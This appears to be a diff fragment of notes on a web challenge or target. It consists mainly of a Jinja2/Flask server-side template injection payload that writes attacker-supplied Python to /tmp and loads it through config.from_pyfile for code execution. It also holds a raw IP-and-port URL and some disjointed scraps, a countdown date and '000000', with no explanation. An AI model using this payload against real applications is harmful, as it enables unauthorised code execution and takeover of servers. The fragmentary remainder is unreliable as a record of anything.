@@ -29,3 +29,12 @@ Connection: close
 {"artist.name":"a"}
 
 ?exploit={%set%20a,b,c,d,e,f,g,h,i%20=%20request.__class__.__mro__%}{{i.__subclasses__().pop(40)(request.args.file,request.args.write).write(request.args.payload)}}{{config.from_pyfile(request.args.file)}}&file=/tmp/foo.py&write=w&payload=print+1337
+
+
+
+http://46.101.23.188:30951/?format=u
+000000
+
+Sunday the 10th of October. In approximately 121:18:10.
+
+
